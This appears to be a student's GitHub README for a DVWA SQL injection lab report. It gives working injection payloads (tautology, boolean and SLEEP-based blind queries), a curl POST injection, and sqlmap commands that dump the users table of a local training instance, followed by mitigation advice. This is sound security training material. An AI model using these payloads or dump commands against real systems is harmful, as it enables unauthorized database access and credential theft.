DVWA — SQL Injection Labs (Task 15) — Report

Short description
This repository contains my Task 15 report for the DVWA SQL Injection labs (Low, Medium, High). It documents steps taken, commands used, evidence (screenshots / output files), and recommended mitigations. The report is intended for learning / lab purposes only — do not use these techniques against systems you do not own or have explicit permission to test.

Contents

report/ — The written report (PDF / DOCX / Markdown) and screenshots.

README.md — this file.

Environment

DVWA host: http://127.0.0.1/DVWA/ (local VM)

DVWA changelog: v1.9 (changelog shows v1.10 Not Yet Released)

Tools: Firefox, Burp Suite (optional), sqlmap (1.9.x), curl, MySQL/MariaDB, php (Apache/PHP stack)

User: lab environment; all testing performed on locally-hosted DVWA instance.

How to reproduce (high level)

These reproduce instructions assume you have a running DVWA instance on 127.0.0.1 and a valid session cookie if needed.

1. Prepare

Open DVWA → Setup → Create/Reset DB.

Log in as admin (or other test account).

Set security level to the target (Low / Medium / High) from the DVWA Security page.

2. Low (direct injection)

Manual payload (in id GET parameter):

?id=1' OR '1'='1' -- -


Example sqlmap:

sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=REDACTED" --level=5 --risk=3 --batch --dbs

3. Medium (select / POST)

Replace the select with an input (DevTools) or intercept/modify POST in Burp:

id=1 OR 1=1 -- -   # POST body: id=1 OR 1=1 -- -&Submit=Submit


Curl example:

curl -s -X POST -H "Cookie: PHPSESSID=REDACTED" \
  --data "id=1 OR 1=1 -- -&Submit=Submit" \
  "http://127.0.0.1/DVWA/vulnerabilities/sqli/"


sqlmap (POST):

sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" --cookie="PHPSESSID=REDACTED" \
  -D dvwa -T users --dump --batch

4. High (blind — boolean/time)

Boolean example:

1' AND SUBSTRING((SELECT database()),1,1)='d' -- -


Time-based example (MySQL):

1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a', SLEEP(5), 0) -- -


Force sqlmap to use time technique:

sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" --cookie="PHPSESSID=REDACTED" \
  --technique=T --time-sec=5 --level=5 --risk=3 -D dvwa -T users --dump


Note: In my lab sqlmap succeeded but manual SLEEP() showed no measurable delay — see evidence/curl_time_test.txt and the report for analysis and reasons (SQLite backend, filtering, buffering, etc.).

##Findings — short summary

Low: direct injectable parameter; data extraction via UNION / boolean succeeded.

Medium: parameter moved to POST and uses a <select>, but injection is still possible by modifying the request (DOM edit, proxy, or crafted POST).

High: direct output blocked; sqlmap used blind techniques (boolean/time) to extract data. Manual SLEEP() payloads did not show an observable delay in my environment — likely due to backend settings or filtering — but boolean extraction worked.

##Conclusion & recommended mitigations

Root cause: unsanitized user data concatenated into SQL queries.

Recommendations:

Replace dynamic SQL concatenation with prepared statements / parameterized queries (PDO or mysqli prepared statements).

Rotate any test credentials exposed during the lab and restrict DB privileges (least privilege).

Add input validation, output encoding, and server-side WAF/rate-limiting.

Re-test after fixes using the same payloads and automated tools.

Contact

If you need clarifications or want the sanitized sqlmap/curl output adapted for inclusion in another report, open an issue or contact me via GitHub.
Note: Damn Vulnerable Web Application (DVWA) is third-party software created for security training. This repository does not claim ownership of DVWA itself. All materials here relate to my educational use of DVWA for lab exercises, testing, and reporting.

Disclaimer: All materials, commands, and scripts in this repository were created and executed strictly for educational purposes on a local lab instance under my control. Do not use these techniques against systems you do not own or have explicit written permission to test. The author accepts no liability for misuse. Sensitive values (cookies, passwords, keys) have been redacted; do not commit real credentials.

# Warning

**Warning:** These scripts and instructions are provided for educational use on a local lab environment only. Use at your own risk. The author accepts no responsibility or liability for any damage, loss, or legal consequences that may result from misuse or running these commands on systems you do not own or have explicit permission to test.

---

